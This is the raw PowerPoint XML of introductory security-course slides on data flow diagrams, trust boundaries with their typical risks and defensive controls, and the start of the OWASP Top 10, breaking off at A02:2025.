                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CB051563-DF90-0648-A32E-7B5605677682}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7345543" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A DFD’s job is to visually map </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>where data appears</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>how it moves</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>where an attacker could interfere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>—so you can place the right controls in the right spots.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4115244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DAA59-614F-CA66-B7FB-262ADB14E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716FD-30B7-0C95-AACD-335F4D00C22D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Trust boundaries in DFD's</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B2858D41-ABFD-4C7A-F8EB-4A6FB4500D04}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7075278" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Trust Boundary</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is any place in a system where assumptions change about </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>who</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> can do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>what</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>which data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26756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CC57-704B-C24F-90DC-854A24271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599BE-1047-E10E-2F26-A1D1DD1AA724}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Trust boundaries - Common examples</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95AEF5BE-06E8-221C-4DA1-DF9B5652B681}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7075278" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Internet → your web app</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Browser → server (HTTP request handling)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Client → API gateway → microservice</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>External SSO/IdP → your app after token verification</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mobile app → backend</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9479905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6683B-B05C-3CCA-5926-70F899667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F73AC-090B-C53E-5FD7-EE708AEA2BAC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Trust boundaries - Common examples</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="11" name="Content Placeholder 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F5A45F56-B31D-6C7B-9A80-11B5EB31FB68}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3038059373"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="838200" y="1825625"/>
          <a:ext cx="10515598" cy="3857625"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="3063428">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="469705673"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3291556">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="969434174"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4160614">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="389782237"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="285750">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPts val="1575"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Common Boundaries</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1"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b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Typical risks</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1"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b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Controls</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1"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643710589"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="695325">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPts val="1575"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Edge (Internet → Gateway)</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Injection, credential stuffing, token replay</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TLS 1.3+; HSTS; rate limiting; IP reputation; bot </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>mgmt</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>; OAuth2/OIDC w/ PKCE; short-lived tokens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98702530"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="895350">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPts val="1575"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Browser ↔ App</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XSS, CSRF, clickjacking</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Strict CSP (nonces); </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>SameSite</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>HttpOnly</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>/Secure cookies; </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>framebusting</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>; input → schema validation at server</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24050520"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="495300">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPts val="1575"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Service ↔ Service (east-west)</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SSRF, confused deputy, IDOR via internal APIs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err="1">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>mTLS</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t> in mesh; per-route </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>authz</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t> (OPA/ABAC); audience-scoped JWTs; least-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>priv</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t> client creds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859329140"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="495300">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPts val="1575"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Service  ↔DB/Cache</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SQL/NoSQL injection, over-privileged accounts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Param queries; role-per-service; RLS/column-level security; encrypt at rest; rotation</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0937201"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="495300">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPts val="1575"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Org ↔ Vendor (PSP, email, LLM/API)</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Data leakage, weak contractual controls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DPIAs; DLP; tokenization; field-level redaction; minimal scopes; audit/egress allowlists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5147117"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="495300">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr fontAlgn="base">
                        <a:lnSpc>
                          <a:spcPts val="1575"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Prod ↔ Analytics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Oversharing PII, re-identification</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575"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Pseudonymization; differential access; row-level filters; delayed/aggregated exports</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="Aptos"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="67056" marR="67056" marT="33528" marB="335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82744722"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3366180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5E1F4-F181-EB20-AC3A-58C8525B5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86712-C848-B07F-0008-2F4D569AB99A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1917941"/>
            <a:ext cx="10515600" cy="3020530"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Lesson 01 - Security Refresher</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Topic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 03 – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
              </a:rPr>
              <a:t>The OWASP Top 10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1515692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B698D-3A99-8C66-1A6E-A49EC25DF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D1572-0C5F-D984-B409-3CBBCC3184A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>The OWASP Top 10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28EC342F-5AFA-440A-305B-374CA4320426}"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>OWASP Top 10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001D35"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>a standard awareness document that highlights the 10 most critical security risks to web applications</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2532949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1F8BF-9FBA-61F5-2E94-23369ADA0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0F17E-A7D5-0D8D-DADB-09AEE13E7690}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>A01:2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A6F733E6-FC17-0268-5BED-F7749B9F2F9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7222359" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>BROKEN ACCESS CONTROL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>Missing or flawed access rules let attackers act as admins.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
              </a:rPr>
              <a:t>Bypass, privilege elevation, and data exposure happen here.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="326043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5909D-BE4F-8DAE-DD08-F27BD73F0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203A3-CCC6-745E-81BD-708655CA6344}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>A02:2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
